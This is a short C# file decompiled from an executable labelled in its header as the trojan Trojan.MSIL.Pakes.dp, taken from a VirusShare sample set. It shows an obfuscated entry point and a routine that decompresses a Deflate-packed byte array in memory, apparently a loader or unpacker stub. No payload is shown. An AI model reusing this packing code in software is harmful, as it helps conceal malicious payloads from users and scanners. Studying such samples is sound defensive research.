// Decompiled with JetBrains decompiler
// Type: 
// Assembly: done, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 90D4F632-034C-43BD-BD43-C22AB0B5643D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Pakes.dp-503e1a67612f5abe48d156e2a755973bc1e031ba5e6cfe9f737c7a48deb29be4.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;

[StandardModule]
public sealed class \u0008
{
  [STAThread]
  public static void \u0002() => \u0006.\u0002();

  public static byte[] \u0002(byte[] _param0)
  {
    byte[] numArray;
    try
    {
      numArray = \u0008.\u0002((Stream) new DeflateStream((Stream) new MemoryStream(_param0), CompressionMode.Decompress, true), _param0.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] \u0002(Stream _param0, int _param1)
  {
    int offset = 0;
    byte[] numArray1;
    try
    {
      byte[] numArray2;
      while (true)
      {
        numArray2 = (byte[]) Utils.CopyArray((Array) numArray2, (Array) new byte[checked (offset + _param1 + 1)]);
        int num = _param0.Read(numArray2, offset, _param1);
        if (num != 0)
          checked { offset += num; }
        else
          break;
      }
      numArray1 = (byte[]) Utils.CopyArray((Array) numArray2, (Array) new byte[checked (offset - 1 + 1)]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray1 = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray1;
  }
}
